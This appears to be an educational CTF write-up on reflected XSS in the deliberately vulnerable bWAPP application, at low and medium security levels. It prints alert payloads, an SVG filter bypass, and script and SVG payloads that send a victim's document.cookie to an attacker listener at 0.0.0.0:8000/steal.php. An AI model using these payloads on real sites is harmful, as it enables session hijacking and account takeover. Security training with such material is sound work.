# Reflected XSS (GET)
---

Choose your language / Выберите язык:

- 🇬🇧 [English](WRITEUP.en.md)
- 🇷🇺 [Русский](WRITEUP.md)

# Disclaimer
---

**The text was written and translated by the author manually. A language model was used for formatting and stylistic editing.**

**This material is provided for educational and research purposes only. 
I do not encourage or call for unauthorized access to information systems or violation of the law. 
In my opinion, one of the most effective ways to combat cybercrime is to educate both everyday users and managers, as well as developers of digital products about common vulnerabilities that could potentially be exploited by malicious actors to carry out unlawful acts.**

**⚠️ All actions described in this document were performed within an authorized research environment (CTF/test platform), without violating the rights of third parties or current legislation.**

**Unauthorized interference with computer systems, violation of data storage and processing rules, and other forms of so-called "black-hat" hacking are contrary to law and the ethics of information security.**

**I adhere to the principles of ethical research and responsible vulnerability disclosure.**

---

# Introduction
---

The Buggy Web Application (BWAPP) offers a set of challenges based on the ***Cross-Site Scripting (XSS) vulnerability***. (**A03:2021 - Injection**)

***SECURITY LEVELS COVERED***
- Low
- Medium

# Target
---

![[images/XssReflectedTarget.png]]

# Functionality
---

![[images/XssReflectedFunction.png]]

# Exploitation (phase 1)
---

Testing for Reflected XSS by passing a simple XSS payload in the `lastname` field through BurpSuite or directly on the client side:

#### Payload (Security level - low)

```HTML
<script>alert("Basic XSS")</script>
```

## BurpSuite

![[images/XssReflectedGetBurp.png]]

## Browser

![[images/XssReflectedBrowser.png]]

## Result

![[images/XssReflectedSuccess.png]]

The application is vulnerable to Reflected XSS. This vulnerability can be used to steal cookies of other users.

Note: For `medium` and `high` security levels in BWAPP, the payloads will differ due to implemented security measures.

## Exploitation (Phase 2)
---

An HTTP server can be set up using Python with the command:

```Bash
python3 -m http.server "port"
```

I didn't specify the port, and the server started on port `8000`.

When a user visits a URL with this payload embedded:

```HTML
<script> var pic = new Image(); pic.src = "http://0.0.0.0:8000/steal.php?cookie=" + document.cookie; </script>
```

Their cookies will be sent to the HTTP server running on port `8000`.

Visiting the URL as the default `bee/bug` user resulted in successful cookie theft:

![[images/XssReflectedCookieTheftTest.png]]
(PHPSESSID contains a token used for user authentication)

Now let's simulate victim interaction:

![[images/XssReflectedMamont1.png]]

I created a victim user and used their credentials to log into BWAPP.

Once the victim follows the malicious link (which in the real world is typically provided through social engineering methods), the cookie value is sent to the attacker's server:

![[images/XssReflectedMamont2.png]]

It worked! The `Mamont` user's cookies were successfully compromised without their knowledge:

![[images/XssReflectedMamontCookie.png]]
(For clearer output, I restarted the server instance)

## Medium-level Approach
---

BWAPP at `medium` security level implements defense measures against basic XSS payloads:

```HTML
<script>alert("Basic XSS")</script>
```

However, the `svg`-based payload bypasses the filters, resulting in successful code execution:

```HTML
<svg onload=alert(1)>
```

### Medium-level cookie theft payload

This payload is similar to the low-level approach but uses `svg`:

```HTML
<svg xmlns="http://www.w3.org/2000/svg" onload="var pic=new Image(); pic.src='http://0.0.0.0:8000/steal.php?cookie=' + document.cookie;">
</svg>
```